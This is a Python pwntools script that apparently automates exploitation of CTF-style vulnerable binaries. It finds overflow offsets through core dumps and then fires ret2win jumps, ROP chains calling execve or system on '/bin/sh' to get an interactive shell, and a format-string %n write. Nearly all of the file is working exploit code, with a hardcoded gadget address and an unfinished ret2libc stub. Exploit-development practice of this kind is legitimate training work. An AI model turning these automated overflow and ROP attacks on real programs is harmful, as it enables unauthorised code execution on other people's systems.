from pwn import *
from sddr_rop import *
import subprocess

def isSOF(e):
	try:
		e.sym['gets']
		return True
	except:
		return False
#	elif(check == 2):
#		try:
#			e.sym['strcpy']
#			return True
#		except:
#			return False
#	elif(check == 3):
#		try:
#			e.sym['sprintf']
#			return True
#		except:
#			return False
#	elif(check == 4):
#		try:
#			e.sym['printf']
#			return True
#		except:
#			return False

def isGadget(e):
	try:
		e.sym['gadget']
		return True
	except:
		return False

def isSyscall(r):
	try:
		(r.find_gadget(['syscall']))[0]
		return True
	except:
		return False


def isWin(e):
	try:
		e.sym['win']
		return True
	except:
		return False


def isSystem(e):
	try:
		e.sym['system']
		return True
	except:
		return False

def isExecve(e):
	try:
		e.sym['execve']
		return True
	except:
		return False


def isBinsh(e):
	try:
		next(e.search(b'/bin/sh\x00'))
		return True
	except:
		return False

def isPwnme(e):
	try:
		e.sym['pwnme']
		return True
	except:
		return False

def Identify(e,r):
	executable = []
	temp = ""
	executable.append(e.path)

#	for i in range(1,2):
#		if(isSOF(e,i)):
#			temp += "+"
#		else:
#			temp += "-"
#	executable.append('isSOF['+ temp + ']')
	if(isSOF(e)):
		executable.append(True)
	else:
		executable.append(False)

	if(isWin(e)):
		executable.append(True)
	else:
		executable.append(False)

	if(isSystem(e)):
		executable.append(True)
	else:
		executable.append(False)

	if(isBinsh(e)):
		executable.append(True)
	else:
		executable.append(False)

	if(isSyscall(r)):
		executable.append(True)
	else:
		executable.append(False)

	if(isExecve(e)):
		executable.append(True)
	else:
		executable.append(False)	
	if(isPwnme(e)):
		executable.append(True)
	else:
		executable.append(False)
	if(isGadget(e)):
		executable.append(True)
	else:
		executable.append(False)


	return executable
def getPadding(e):
	p = process(e.path)
	p.sendline(cyclic(1024,n=8))
	p.wait()
	core = p.corefile
	p.close()
	os.remove(core.file.name)
	padding = cyclic_find(core.read(core.rsp, 8),n=8)
	return int(padding)

def AttackVector(binary):
	if((binary[1]) and (binary[2])):
		return "Ret2Win"
	elif((binary[6]) and (binary[4])):
		return "Ret2Execve + /bin/sh"
	elif((binary[6]) and not (binary[4])):
		return "Ret2Execve - /bin/sh"
	elif(binary[7]):
		return "Pwnme"
	elif(binary[1] and binary[3] and binary[4]):
		return "Syscall /bin/sh"
	elif((binary[1]) and (binary[3])):
		return "WritePrim"
	else:
		return "dunno"


def Pwnme(r,e):
	try:
		pwnme_address = e.sym['pwnme']
		for i in range(20):
			p = process(e.path)
			format_write = (b'%1337d%' + (b'%d' % i) + b'$n' + b'      ')+p64(pwnme_address)
			print(format_write)
			p.sendline(format_write)
			print(p.recv())
			print("\n\n")
			p.wait()
			try:
			    output = str(p.recv())
			    if "flag" in output:
			        print(output)
			        p.close()
			        break
			except:
			    print("No more output")
			p.close()
	except:
		print("error at: " + e.path)


def Ret2Execve(r,e):
	try:
		pad = getPadding(e)
			
		padding = b'A' * pad
		p = process(e.path)

		pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
		pop_rsi = (r.find_gadget(['pop rsi', 'ret']))[0]
		pop_rdx = (r.find_gadget(['pop rdx', 'ret']))[0]
		binsh = next(e.search(b'/bin/sh'))
		execve = e.sym['execve']

		chain = p64(pop_rdi)+p64(binsh)
		chain += p64(pop_rsi)+p64(0)
		chain += p64(pop_rdx)+p64(0)
		chain += p64(execve)

		p.sendline(padding+chain)
		p.interactive()

		p.close()
	except:
		print("error at: " + e.path)

def WritePrim(r,e):
	try:
		pad = getPadding(e)
			
		padding = b'A' * pad
		p = process(e.path)
		#search for gadgets
		# This is hardcoded/using pwn rop, will be integrating ROPgadget once that function is complete.

		gadget_finder = Find_gadget(e.path, ["qword"], "mov|ret")

		potential_gadgets = gadget_finder.gadget_search()
		#Check every potnetial gadget to see if its possible to set it up

		pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
		
		move = 0x000000000040114b
		pop_rsi_r15_ret = r.find_gadget(['pop rsi','pop r15','ret'])[0]
		#search for gadgets
		data = b'/bin/sh\0'
		addr2write = e.get_section_by_name(".data").header.sh_addr	
		system = e.sym['system']

		chain = p64(pop_rsi_r15_ret) + p64(addr2write) + data
		chain += p64(move) + p64(pop_rdi)
		chain += p64(addr2write) + p64(system)
		p.sendline(padding+chain)
		p.interactive()

		p.close()
	except:
		print("error at: " + e.path)


def Ret2Win(r,e):
	try:
		padding = getPadding(e)
		p = process(e.path)

		win = e.sym['win']

		#log.info('padding: ' + hex(padding))
		win_address = e.sym['win']
		log.info('win address: ' + hex(win_address))

		chain = b'A' * padding + p64(win_address)
		p.sendline(chain)
		p.wait()
		print(p.recv())
		p.close()
	except:
		print("error at: " + e.path)
		

#def Ret2Libc(i,r,e):
	